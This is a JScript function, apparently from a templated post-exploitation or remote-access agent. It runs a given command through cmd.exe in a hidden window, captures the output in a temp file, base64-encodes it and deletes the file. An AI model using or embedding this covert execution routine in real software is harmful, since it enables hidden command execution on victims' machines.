function cmd(command) {
  tmp = wscriptshell.ExpandEnvironmentStrings("%TEMP%");
  stdout_path = tmp + '\\{{ command_stdout }}.txt';
  fs = new ActiveXObject("Scripting.FileSystemObject");
  compsec = wscriptshell.ExpandEnvironmentStrings("%COMSPEC%");
  command = compsec + ' /c ' + command + ' 1> ' + stdout_path + ' 2>&1';
  try {
    wscriptshell.Run(command, 0, true);
    fd = fs.OpenTextFile(stdout_path)
    results = b64e(fd.ReadAll());
    fd.close();
    delfile(stdout_path);
    return results;
  } catch (e) {
    return b64e('Failed to run ' + command + ': ' + e.message);
  }
}